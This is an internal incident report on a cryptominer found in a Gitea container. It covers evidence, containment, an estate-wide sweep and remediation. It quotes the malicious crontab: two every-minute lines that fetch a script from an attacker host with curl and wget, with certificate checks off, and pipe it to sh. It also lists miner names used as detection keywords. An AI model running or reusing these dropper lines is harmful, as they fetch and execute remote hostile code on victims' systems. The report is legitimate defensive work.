# Security incident — cryptominer in the `git` container (i1)

Found 2026-09-27, incidentally, while surveying container CPU for
`container-placement.md`: i1 (`192.168.1.51`) was at load ~18 on 4 vCPU, and the
`git` container held a process `./linuxsys` burning ~208 % CPU and 2.3 GiB.

**Status: contained** (payload killed, dropper cron removed). The container
itself is *not* trusted and still needs rebuilding — see Remediation.

## What was found

| | |
|---|---|
| Host / container | `i1` `.51` / Incus container **`git`** (the Gitea host, `.90`) |
| Payload | `/home/git/linuxsys` — ran as user `git`, ~208 % CPU, 2.3 GiB RES |
| Payload sha256 | `4d17d32ed6efe92ea61d16602f9c6cd5261cdd3820adec427ee68d4088b6ab5b` |
| Binary on disk | **self-deleted** after exec (`/proc/<pid>/exe -> /home/git/linuxsys (deleted)`); a copy was preserved before it vanished |
| Dropper | user `git`'s crontab, every minute |
| C2 / staging | `archive.repositoryserver.org` (`/linuxsh`) |

The malicious crontab (`/var/spool/cron/crontabs/git`):

```
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * curl -s --connect-timeout 10 -k https://archive.repositoryserver.org/linuxsh | sh > /dev/null 2>&1
* * * * * busybox wget -T 10 --no-check-certificate -q -O - http://archive.repositoryserver.org/linuxsh | sh > /dev/null 2>&1
```

The parent was `systemd` → `cron.service`; the process had no name, no service
unit, and a deleted binary — i.e. a classic `curl … | sh` miner with a
two-transport (curl/wget) dropper for robustness.

## Impact

- i1 CPU: load ~6 → ~18 on 4 vCPU; **~2.4 GiB of RAM** held by the payload.
- i1's high `load average` in the 2026-09-27 placement survey was this process,
  not the placement itself.
- No evidence the *host* kernel or any other container was touched (scope below).

## Containment performed

1. Evidence saved on i1 at `/root/incident-20260927-git/`
   (`git-crontab.bak`, `linuxsys-ps.txt`, `linuxsys.sample` (mode 000),
   `linuxsys.sha256`, `netstat.txt`).
2. `crontab -u git -r` — removed the dropper (verified: `no crontab for git`).
3. `kill -9 <pid>` on the payload (verified gone).
4. Re-verified the container: `gitea.service` active, `:3000` → 200;
   `/etc/cron.d`, `atjobs` and `/var/spool/cron/crontabs` clean; no file under
   `/etc /var/spool /home /root /usr/local` still references the C2.
5. i1 recovered: load 18 → **4.8**, ~2.4 GiB RAM freed.

## Scope — estate-wide sweep (2026-09-27)

Checked every Incus container on i1/i2/i3 (24 containers) and each host's root
crontab for the domain, the `/linuxsys` path, and known miner names
(`xmrig`, `kdevtmpfsi`, `stratum`), plus a host-wide process check:

**Clean everywhere except the i1 `git` container.** No lateral spread observed.

## Remediation still required

The container is compromised, so nothing in it can be trusted:

1. **Rebuild `git`.** Export the Gitea repositories and DB over a path that
   does not run container code, then destroy and recreate the container. Do not
   "clean" it in place.
2. **Rotate everything that container could read**: the Gitea admin and DB
   credentials, the `git` user's SSH keys, and any deploy keys / tokens stored in
   Gitea. (`/home/git/.ssh/authorized_keys` was empty at discovery, but keys
   elsewhere may have been read.)
3. **Find the entry vector.** The `git` container runs Gitea (`:3000`), Postgres,
   MariaDB and Postfix on the LAN. Review Gitea's audit log and access log, and
   its accounts, for the intrusion path. This container was never in NPM — it is
   reachable on the LAN, which is itself worth revisiting.
4. **Decide which Gitea is authoritative.** i1 `git` (`.90`, this container) and
   `.46`'s `atlas-gitea` (`:3004`, which *is* `git.innotel.us`) are both live —
   a duplicate that should be resolved (see `dev-container-migration.md`).
5. **Delete the preserved sample** once analysis is done (it is a live binary,
   stored mode 000).
